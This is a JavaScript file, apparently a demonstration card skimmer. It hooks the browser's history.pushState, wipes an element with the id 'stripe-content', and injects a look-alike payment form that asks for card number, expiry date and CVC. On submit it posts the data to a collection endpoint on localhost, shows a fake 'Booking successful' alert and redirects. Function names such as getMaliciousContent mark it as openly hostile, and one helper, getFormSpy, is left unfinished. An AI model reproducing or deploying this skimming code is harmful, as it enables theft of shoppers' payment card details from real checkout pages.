async function mimicSubmitForm(e) {
  e.preventDefault();

  const formData = new FormData(e.target);
  const parsedData = {};
  for (const data of formData) {
    parsedData[data[0]] = data[1];
  }

  const response = await fetch("http://localhost:3000/api/data", {
    method: "POST",
    body: JSON.stringify(parsedData),
  });

  // const result = await response.json();
  alert("Booking successful!!!");
  window.location.href = "http://localhost:5173";
}

function getMaliciousContent() {
  const formHtml = `
    <form onsubmit="mimicSubmitForm(event);">
        <div style="color: #000; position: relative; display: flex; justify-content: flex-start; align-items: center; padding: 12px; margin-bottom: 24px; background-color: #f8fafc; border-radius: 8px; border: 1px solid #e2e8f0;">
            <div style="display: flex; justify-content: flex-start; align-items: center;">
                <div style="display: flex; flex-direction: column; height: 100%; text-align: center; width: 1.5em;">
                    <svg focusable="false" viewBox="0 0 29 19">
                    <g fill="none" fill-rule="evenodd">
                        <g fill="#515e80">
                        <path
                            opacity="0.2"
                            d="M26.58 19.0001H2.42C2.10482 19.0027 1.79222 18.9433 1.50002 18.8251C1.20783 18.7069 0.941782 18.5323 0.717062 18.3113C0.492342 18.0903 0.313355 17.8272 0.190321 17.537C0.0672866 17.2468 0.00261552 16.9353 0 16.6201L0 2.38008C0.00261552 2.06491 0.0672866 1.75333 0.190321 1.46315C0.313355 1.17297 0.492342 0.909867 0.717062 0.688861C0.941782 0.467855 1.20783 0.293278 1.50002 0.175097C1.79222 0.0569162 2.10482 -0.00255337 2.42 8.40317e-05H26.58C26.8952 -0.00255337 27.2078 0.0569162 27.5 0.175097C27.7922 0.293278 28.0582 0.467855 28.2829 0.688861C28.5077 0.909867 28.6866 1.17297 28.8097 1.46315C28.9327 1.75333 28.9974 2.06491 29 2.38008V16.6301C28.9921 17.2649 28.733 17.8707 28.2794 18.3148C27.8259 18.759 27.2148 19.0054 26.58 19.0001ZM10 5.83008C10 5.37008 9.65 5.00008 9.22 5.00008H3.78C3.35 5.00008 3 5.37008 3 5.83008V9.17008C3 9.63008 3.35 10.0001 3.78 10.0001H9.22C9.65 10.0001 10 9.63008 10 9.17008V5.83008Z"
                        ></path>
                        <path
                            opacity="0.3"
                            d="M25 15H22C21.35 15 21 14.7 21 14C21 13.3 21.35 13 22 13H25C25.65 13 26 13.3 26 14C26 14.7 25.65 15 25 15ZM19 15H16C15.35 15 15 14.7 15 14C15 13.3 15.35 13 16 13H19C19.65 13 20 13.3 20 14C20 14.7 19.65 15 19 15ZM13 15H10C9.35 15 9 14.7 9 14C9 13.3 9.35 13 10 13H13C13.65 13 14 13.3 14 14C14 14.7 13.65 15 13 15ZM7 15H4C3.35 15 3 14.7 3 14C3 13.3 3.35 13 4 13H7C7.65 13 8 13.3 8 14C8 14.7 7.65 15 7 15Z"
                        ></path>
                        </g>
                    </g>
                    </svg>
                </div>
                <input
                    name="cardNumberInput"
                    placeholder="Card number"
                    style="background-color: transparent; color: #000; margin-left: 10px; font-size: 1em; border: none; outline: none;"/>
            </div>
            <div style="width: 80px;">
                <input
                    name="cardExpiryDateInput"
                    placeholder="MM / YY"
                    style="background-color: transparent; color: #000; margin-left: 10px; font-size: 1em; border: none; outline: none;"/>
            </div>
            <div style="width: 70px;">
                <input
                    name="cvvInput"
                    placeholder="CVC"
                    style="background-color: transparent; color: #000; margin-left: 10px; font-size: 1em; border: none; outline: none;"/>
            </div>
        </div>
        <div>
            <button
            style="width: 100%; background-color: #4f46e5; color: #fff; padding: 14px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer;">
            Confirm Purchase
            </button>
        </div>
    </form>
    `;

  return formHtml;
}

function getFormSpy() {
  const form = document.createElement("form");
  form.onsubmit = (e) => e.preventDefault();
  form.style.color = "#000";

  const cardNumberWrapper = document.createElement("div");
  cardNumberWrapper.style.display = "flex";
  cardNumberWrapper.style.flexDirection = "column";
  cardNumberWrapper.style.maxWidth = "200px";
  cardNumberWrapper.style.marginBottom = "10px";
}

function init() {
  const originalPushState = window.history.pushState;
  window.history.pushState = function (...args) {
    originalPushState.apply(this, args);

    setTimeout(() => {
      const stripeContent = document.getElementById("stripe-content");
      stripeContent.childNodes.forEach((child) => child.remove());
      stripeContent.innerHTML = getMaliciousContent();
    }, 10);
  };
}

init();
